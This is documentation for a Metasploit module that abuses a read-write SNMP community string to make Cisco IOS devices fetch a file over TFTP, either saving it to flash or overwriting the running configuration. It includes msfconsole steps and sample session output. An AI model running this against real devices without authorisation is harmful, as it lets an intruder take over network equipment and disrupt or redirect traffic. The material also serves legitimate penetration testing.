## Vulnerable Application

  Cisco IOS devices can be configured to retrieve, via tftp,  a file via SNMP.
  This is a well [documented](https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/15217-copy-configs-snmp.html#copying_startup)
  feature of IOS and many other networking devices, and is part of an administrator functionality.
  This functionality can also be used to change their running configuration. This is documented [here](https://www.ciscozine.com/send-cisco-commands-via-snmp/). 
  A read-write community string is required, as well as a tftp server (metasploit includes one).
  The default functionality of the module will upload the file and it will be saved to `flash:`.
  The `Override_Config` action will override the running configuration of the device and the file will not be saved.

## Verification Steps

Upload_File (Default Action)

  1. Enable SNMP with a read/write community string on IOS: `snmp-server community private rw`
  2. Start msfconsole
  3. Do: ```use auxiliary/scanner/snmp/cisco_upload_file```
  4. Do: ```set COMMUNITY [read-write snmp]```
  5. Do: ```set lhost [your IP address]```
  6. Do: ```set rhosts [ip]```
  7. Do: ```set source [file]```
  8. Do: ```run```
  
Override_Config

  1. Enable SNMP with a read/write community string on IOS: `snmp-server community private rw`
  2. Start msfconsole
  3. Do: ```use auxiliary/scanner/snmp/cisco_upload_file```
  4. Do: ```set COMMUNITY [read-write snmp]```
  5. Do: ```set lhost [your IP address]```
  6. Do: ```set rhosts [ip]```
  7. Do: ```set source [file]```
  8. Do: ```set action [Override_Config]```
  9. Do: ```run```
  10. You can **Verify** that the running config has been overridden by using the **auxiliary/scanner/snmp/cisco_config_tftp** module to download the current running config from the device.

## Options

  **COMMUNITY**

  The SNMP community string to use which must be read-write.  Default is `public`.

  **SOURCE**

  The location of the source file to be uploaded to the Cisco device.

## Scenarios

### Cisco UC520-8U-4FXO-K9 running IOS 12.4

```
msf5 > setg rhosts 2.2.2.2
rhosts => 2.2.2.2
msf5 > use auxiliary/scanner/snmp/cisco_upload_file
msf5 auxiliary(scanner/snmp/cisco_upload_file) > set source /tmp/backup_config2
source => /tmp/backup_config2
msf5 auxiliary(scanner/snmp/cisco_upload_file) > set community private
community => private
msf5 auxiliary(scanner/snmp/cisco_upload_file) > run

[*] Starting TFTP server...
[*] Copying file backup_config2 to 2.2.2.2...
[*] Scanned 1 of 1 hosts (100% complete)
[*] Providing some time for transfers to complete...
[*] Shutting down the TFTP service...
[*] Auxiliary module execution completed
```
### Cisco 3560G switch running IOS 12.2

```

`msf5 auxiliary(scanner/snmp/cisco_upload_file) > set COMMUNITY private`
`COMMUNITY => private`
`msf5 auxiliary(scanner/snmp/cisco_upload_file) > set LHOST 10.20.164.164`
`LHOST => 10.20.164.164`
`msf5 auxiliary(scanner/snmp/cisco_upload_file) > set action Override_Config`
`action => Override_Config`
`msf5 auxiliary(scanner/snmp/cisco_upload_file) > set rhosts 10.20.205.5`
`rhosts => 10.20.205.5`
`msf5 auxiliary(scanner/snmp/cisco_upload_file) > set source /root/Desktop/newconfig`
`source => /root/Desktop/newconfig`
`msf5 auxiliary(scanner/snmp/cisco_upload_file) > run`

`[*] Starting TFTP server...`
`[*] Copying file newconfig to 10.20.205.5...`
`[*] Scanned 1 of 1 hosts (100% complete)`
`[*] Providing some time for transfers to complete...`
`[*] Shutting down the TFTP service...`
`[*] Auxiliary module execution completed`

```
